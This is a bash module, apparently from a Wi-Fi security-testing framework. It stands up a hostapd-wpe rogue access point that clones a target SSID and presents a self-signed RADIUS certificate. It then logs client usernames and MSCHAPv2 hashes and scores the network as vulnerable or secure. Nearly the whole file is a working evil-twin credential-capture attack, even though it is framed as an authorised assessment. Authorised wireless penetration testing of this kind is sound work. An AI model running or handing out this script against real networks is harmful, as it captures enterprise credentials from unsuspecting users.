#!/usr/bin/env bash
# MODULE_META
# NAME="EAP Certificate Validation Testing"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="yes"
# TOOLS="hostapd-wpe,openssl"
# DESC="Test whether clients validate RADIUS server certificate (EAP-TLS/PEAP/TTLS)"
# REQS="monitor_iface,target_ssid,target_channel"
# PCAP="yes"
# TIMED="yes"
# PROMPTS=""
# DECODE="wifi_eap"

set -euo pipefail

INTERFACE="${MONITOR_INTERFACE:-}"
SSID="${GUEST_SSID:-}"
CHANNEL="${GUEST_CHANNEL:-6}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
CAPTURE_TIME="${CAPTURE_TIME:-60}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"

ASTRA_COLOR_RED="${ASTRA_COLOR_RED:-}"
ASTRA_COLOR_GREEN="${ASTRA_COLOR_GREEN:-}"
ASTRA_COLOR_YELLOW="${ASTRA_COLOR_YELLOW:-}"
ASTRA_COLOR_RESET="${ASTRA_COLOR_RESET:-}"

TC_ID="D8"
CERT_DIR="${EVIDENCE_DIR}/D8_certs"
HOSTAPD_CONF="${EVIDENCE_DIR}/D8_hostapd_wpe.conf"
LOG_FILE="${EVIDENCE_DIR}/D8_hostapd_wpe.log"
RESULT_JSON="${EVIDENCE_DIR}/D8_result.json"

mkdir -p "${EVIDENCE_DIR}" "${CERT_DIR}"

if [[ -z "${INTERFACE}" ]]; then
    echo "[!] MONITOR_INTERFACE not set."
    exit 1
fi

if [[ -z "${SSID}" ]]; then
    echo "[!] GUEST_SSID not set. EAP testing requires a target SSID."
    exit 1
fi

printf "%b[*] Starting [D8] EAP Certificate Validation Test on %s (Ch: %s)%b\n" \
    "${ASTRA_COLOR_YELLOW}" "${SSID}" "${CHANNEL}" "${ASTRA_COLOR_RESET}"

# Generate self-signed cert
openssl req -newkey rsa:2048 -nodes -keyout "${CERT_DIR}/server.key" -x509 -days 1 -out "${CERT_DIR}/server.crt" -subj "/CN=FreeRADIUS/O=Test/C=US" 2>/dev/null

# Write hostapd-wpe config
printf "interface=%s\ndriver=nl80211\nssid=%s\nchannel=%s\nhw_mode=g\nieee8021x=1\neapol_key_index_workaround=0\neap_server=1\neap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user\nca_cert=%s/server.crt\nserver_cert=%s/server.crt\nprivate_key=%s/server.key\ndh_file=/etc/hostapd-wpe/hostapd-wpe.dh\n" \
    "${INTERFACE}" "${SSID}" "${CHANNEL}" "${CERT_DIR}" "${CERT_DIR}" "${CERT_DIR}" > "${HOSTAPD_CONF}"

# Run hostapd-wpe with telemetry heartbeat
(
    ELAPSED=0
    while [[ $ELAPSED -lt $CAPTURE_TIME ]]; do
        PCT=$(( 10 + (ELAPSED * 80 / CAPTURE_TIME) ))
        [[ $PCT -gt 90 ]] && PCT=90
        "${ASTRA_BIN}" record-progress --session-dir "${SESSION_DIR}" --tc "${TC_ID}" --percent "$PCT" --status "Waiting for EAP authentication attempts..."
        sleep 5; ELAPSED=$((ELAPSED + 5))
    done
) &
TEL_PID=$!

if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    timeout --foreground "${CAPTURE_TIME}" hostapd-wpe "${HOSTAPD_CONF}" 2>&1 | tee "${LOG_FILE}" || true
else
    timeout "${CAPTURE_TIME}" hostapd-wpe "${HOSTAPD_CONF}" > "${LOG_FILE}" 2>&1 || true
fi

kill "${TEL_PID}" 2>/dev/null || true

# Parse LOG_FILE
VULNERABLE_CLIENTS=0
CREDENTIAL_LINES=0

if [[ -f "${LOG_FILE}" ]]; then
    VULNERABLE_CLIENTS=$(grep -ciE 'username:|mschapv2|TLS handshake' "${LOG_FILE}" || true)
    CREDENTIAL_LINES=$(grep -ciE 'username:|password:|mschapv2' "${LOG_FILE}" || true)

    # Ensure they are numbers
    [[ "${VULNERABLE_CLIENTS}" =~ ^[0-9]+$ ]] || VULNERABLE_CLIENTS=0
    [[ "${CREDENTIAL_LINES}" =~ ^[0-9]+$ ]] || CREDENTIAL_LINES=0
fi

STATUS="SECURE"
if [[ "${VULNERABLE_CLIENTS}" -gt 0 ]]; then
    STATUS="VULNERABLE"
fi

# Write RESULT_JSON
printf "{\n  \"tc_id\": \"D8\",\n  \"status\": \"%s\",\n  \"vulnerable_clients\": %d,\n  \"credential_lines\": %d,\n  \"cert_used\": \"%s/server.crt\",\n  \"log_file\": \"%s\"\n}\n" \
    "${STATUS}" "${VULNERABLE_CLIENTS}" "${CREDENTIAL_LINES}" "${CERT_DIR}" "${LOG_FILE}" > "${RESULT_JSON}"

# Summary and Record Finding
if [[ "${STATUS}" == "VULNERABLE" ]]; then
    printf "%b[!] VULNERABLE: %d clients attempted EAP authentication without certificate validation.%b\n" \
        "${ASTRA_COLOR_RED}" "${VULNERABLE_CLIENTS}" "${ASTRA_COLOR_RESET}"

    "${ASTRA_BIN}" record-finding \
        --session-dir "${SESSION_DIR}" \
        --tc "${TC_ID}" \
        --type "vulnerability" \
        --severity "CRITICAL" \
        --name "EAP Certificate Validation Bypass" \
        --desc "Client devices connected to Rogue AP '${SSID}' without validating the RADIUS server certificate, exposing potential credentials." \
        --evidence "${RESULT_JSON}" \
        --rationale "Failure to validate RADIUS certificates allows attackers to intercept WPA-Enterprise credentials (MSCHAPv2 hashes) or perform Machine-in-the-Middle attacks on EAP-TLS/PEAP sessions."
else
    printf "%b[+] SECURE: No clients bypassed certificate validation during the test period.%b\n" \
        "${ASTRA_COLOR_GREEN}" "${ASTRA_COLOR_RESET}"

    "${ASTRA_BIN}" record-finding \
        --session-dir "${SESSION_DIR}" \
        --tc "${TC_ID}" \
        --type "info" \
        --severity "INFO" \
        --name "[D8] EAP Cert Validation Secure" \
        --desc "No evidence of certificate validation bypass observed for SSID '${SSID}'." \
        --evidence "${RESULT_JSON}" \
        --rationale "Clients either did not attempt connection or correctly rejected the untrusted RADIUS certificate presented by the test server."
fi

"${ASTRA_BIN}" record-progress --session-dir "${SESSION_DIR}" --percent 100 --status 'Mission Complete'

exit 0
